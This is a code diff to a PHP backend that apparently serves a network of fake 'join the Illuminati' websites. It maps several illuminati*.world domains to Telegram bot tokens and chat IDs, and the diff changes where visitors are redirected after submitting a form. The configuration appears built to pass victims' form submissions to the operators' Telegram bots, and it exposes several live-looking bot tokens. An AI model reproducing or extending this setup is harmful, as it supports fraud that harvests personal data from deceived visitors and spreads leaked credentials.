@@ -10,7 +10,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             
         ],
-        'redirect' => 'https://illuminatiofficial.world/index.html'
+        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
     ],
     
     'illuminatiofficial.world' => [
@@ -18,7 +18,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             
         ],
-        'redirect' => 'https://illuminatiofficial.world/index.html'
+        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html'
     ],
     
     'illuminatigroup.world' => [
@@ -26,7 +26,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '8459891488:AAHBwkSpyaRAtGCI6yWm_-39c61LJhQgI4w', 'chat_id' => '5978851707'],
         ],
-        "redirect" => "https://illuminatigroup.world/index.html"
+        "redirect" => "https://illuminatigroup.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
 
     'illuminatiglobal.world' => [
@@ -34,7 +34,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '8572613269:AAEMx8dbCNQnUHfKtZ5kuhpVfjE6fBdhofw', 'chat_id' => '6512010552'],
         ],
-        "redirect" => "https://illuminatiglobal.world/index.html"
+        "redirect" => "https://illuminatiglobal.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
 
     'illuminatinetwork.world' => [
@@ -42,7 +42,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '8233162319:AAGUMse4WldCYNsGerfsU2FDnmY-_Heo-yM', 'chat_id' => '6944000447'],
         ],
-        "redirect" => "https://illuminatinetwork.world/index.html"
+        "redirect" => "https://illuminatinetwork.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html"
     ],
 
 ];
@@ -173,7 +173,7 @@ if ($_SERVER["REQUEST_METHOD"] === "POST") {
         }
         
         // Redirect to default thank you page
-        header("Location: https://illuminatiofficial.world/index.html");
+        header("Location: https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html");
         exit;
     }
 } else {
